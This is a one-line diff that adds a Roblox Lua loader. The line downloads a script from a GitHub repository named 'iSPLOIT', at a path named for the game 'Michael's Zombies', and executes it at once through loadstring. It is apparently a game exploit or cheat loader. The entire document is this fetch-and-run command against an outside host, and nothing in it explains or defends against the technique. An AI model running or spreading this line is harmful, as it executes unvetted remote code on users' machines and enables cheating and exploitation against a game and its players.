@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fliptwo/iSPLOIT/main/Michael's%20Zombies", true))()
